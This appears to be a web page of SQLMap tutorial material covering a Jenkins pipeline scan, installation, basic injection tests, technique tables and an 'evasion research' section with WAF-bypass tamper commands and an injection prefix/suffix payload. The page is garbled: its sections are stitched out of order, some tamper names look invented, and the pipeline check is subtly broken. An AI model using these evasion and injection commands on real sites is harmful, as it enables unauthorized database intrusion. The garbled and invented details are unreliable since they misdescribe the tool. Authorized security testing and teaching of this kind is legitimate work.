#### Automated Security Pipeline

::: terminal-window
::: terminal-header
::: terminal-buttons
::: {.terminal-button .close}
:::

::: {.terminal-button .minimize}
:::

::: {.terminal-button .maximize}
:::
:::

[CI/CD Security Integration]{style="color: #ccc; margin-left: 10px;"}
:::

::: terminal-content
    # Jenkins Pipeline Example
    pipeline {
        agent any
        
        stages {
            stage('Deploy to Staging') {
                steps {
                    sh 'deploy-to-staging.sh'
                }
            }
            
            stage('SQL Injection Test') {
                steps {
                    script {
                        def result = sh(
                            script: 'python3 sqlmap.py -u "${STAGING_URL}" --batch --level=2 --risk=1',
                            returnStatus: true
                        )
                        
                        if (result == 0 && sh('grep -q "vulnerable" sqlmap.log')) {
                            error('SQL injection vulnerability detected!')
                        }
                    }
                }
            }
            
            stage('Deploy to Production') {
                when {
                    expression { currentBuild.result == null }
                }
                steps {
                    sh 'deploy-to-production.sh'
                }
            }
        }
    }
:::
:::
:::

### Advanced Detection Evasion Research

::: code-block
    # Research new evasion techniques
    python sqlmap.py -u "target" --list-tampers | grep -i "bypass\|evas\|waf"

    # Test against specific WAF vendors
    python sqlmap.py -u "target" --tamper=cloudflarebypass --identify-waf

    # Custom payload fuzzing
    python sqlmap.py -u "target" --suffix=")-- " --prefix="' OR ('"

    # Machine learning bypass research
    python sqlmap.py -u "target" --tamper=ml_bypass --technique=B
:::
:::

::: {style="position: absolute; top: 0; left: 0; right: 0; height: 3px; background: linear-gradient(90deg, #ff0080, #00ff80, #0080ff, #ff0080); animation: rainbow 3s linear infinite;"}
:::

### SQLMap Complete Mastery {#sqlmap-complete-mastery style="color: #fff; margin-bottom: 20px; font-size: 1.8em; text-transform: uppercase; letter-spacing: 2px;"}

Advanced SQL Injection Testing & Exploitation Framework

::: {style="margin: 25px 0; display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;"}
::: {.technique-badge style="background: linear-gradient(45deg, #ff4444, #ff6666);"}
Penetration Testing
:::

::: {.technique-badge style="background: linear-gradient(45deg, #44ff44, #66ff66);"}
Security Assessment
:::

::: {.technique-badge style="background: linear-gradient(45deg, #4444ff, #6666ff);"}
Vulnerability Research
:::

::: {.technique-badge style="background: linear-gradient(45deg, #ffff44, #ffff66);"}
Ethical Hacking
:::
:::

::: {style="border-top: 2px solid #333; margin: 25px 0; padding-top: 20px;"}
\"With great power comes great responsibility\"

**⚖️ Legal Notice:** This tool is for authorized security testing only.
Unauthorized use may violate laws and result in severe penalties.
:::

::: {style="margin-top: 25px; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 8px; border: 1px solid #444;"}
[v2.0 \| Comprehensive SQLMap Guide \| Educational Use
Only]{style="color: #555; font-family: monospace;"}
:::

[↑]{style="font-size: 1.2em;"}
:::

    # Ubuntu/Debian
    sudo apt update && sudo apt install sqlmap

    # Arch Linux
    sudo pacman -S sqlmap

    # macOS (Homebrew)
    brew install sqlmap

    # Python pip
    pip install sqlmap

#### Method 3: Docker Installation

::: code-block
    docker pull paoloo/sqlmap
    docker run --rm -it paoloo/sqlmap -u "http://target.com/page?id=1"
:::

#### Method 4: Windows Installation

::: code-block
    # Download from GitHub
    wget https://github.com/sqlmapproject/sqlmap/archive/master.zip
    unzip master.zip
    cd sqlmap-master
    python sqlmap.py --version
:::

::: success
**✅ Verification:** Run `python sqlmap.py --version` to confirm
successful installation and check the current version.
:::

### Initial Setup and Updates

::: code-block
    # Update SQLMap to latest version
    python sqlmap.py --update

    # Check for dependencies
    python sqlmap.py --dependencies

    # Purge output directory
    python sqlmap.py --purge
:::

::: {#basic-usage .section .section}
## Basic Usage

### Simple Vulnerability Test

::: terminal
python sqlmap.py -u \"http://target.com/page?id=1\"
:::

### POST Data Testing

::: terminal
python sqlmap.py -u \"http://target.com/login\" \--data
\"username=admin&password=test\"
:::

### Cookie-based Testing

::: terminal
python sqlmap.py -u \"http://target.com/page\" \--cookie
\"PHPSESSID=abc123; security=low\"
:::

### Basic Output Interpretation

::: code-block
    [12:30:15] [INFO] testing connection to the target URL
    [12:30:15] [INFO] checking if the target is protected by some kind of WAF/IPS
    [12:30:16] [INFO] testing if the target URL content is stable
    [12:30:17] [INFO] target URL content is stable
    [12:30:17] [INFO] testing if GET parameter 'id' is dynamic
    [12:30:17] [INFO] GET parameter 'id' appears to be dynamic
    [12:30:18] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
    [12:30:18] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
    [12:30:18] [INFO] testing for SQL injection on GET parameter 'id'
:::

### Core Command Structure

::: {.attack-vector .risk-high}
#### Basic Syntax Pattern

::: payload-example
python sqlmap.py \[TARGET\] \[OPTIONS\] \[ENUMERATION\] \[TECHNIQUES\]
:::

-   **TARGET:** -u URL, -r request_file, -l log_file
-   **OPTIONS:** \--level, \--risk, \--threads, \--delay
-   **ENUMERATION:** \--dbs, \--tables, \--columns, \--dump
-   **TECHNIQUES:** \--technique, \--tamper, \--os-shell
:::
:::

::: {#detection-techniques .section .section}
## Detection Techniques

### SQLMap Injection Techniques

  Technique             Code   Description                         Speed
  --------------------- ------ ----------------------------------- -----------
  Boolean-based blind   B      True/False response analysis        Slow
  Time-based blind      T      Response time delay analysis        Very Slow
  Error-based           E      Database error message extraction   Fast
  Union query-based     U      UNION SELECT statements             Very Fast
  Stacked queries       S      Multiple query execution            Fast
  Inline queries        Q      Nested SELECT statements            Fast

### Technique Selection

::: code-block
    # Test specific techniques only
    python sqlmap.py -u "http://target.com/page?id=1" --technique=BEUST

    # Boolean and time-based only
    python sqlmap.py -u "http://target.com/page?id=1" --technique=BT

    # Union-based only (fastest)
    python sqlmap.py -u "http://target.com/page?id=1" --technique=U

    # Error-based only
    python sqlmap.py -u "http://target.com/page?id=1" --technique=E
:::

### Detection Level and Risk

::: feature-grid
::: feature-card
#### Level Parameter (1-5)

Controls test aggressiveness and payload variety:

-   **Level 1:** Basic GET parameters
-   **Level 2:** HTTP Cookie headers
-   **Level 3:** HTTP User-Agent/Referer
-   **Level 4:** HTTP Host header
-   **Level 5:** All HTTP headers
:::

::: feature-card
#### Risk Parameter (1-3)

Controls payload risk and potential damage:

-   **Risk 1:** Safe payloads only
-   **Risk 2:** Heavy query time delays
-   **Risk 3:** OR-based payloads
:::
:::

::: code-block
:::
:::
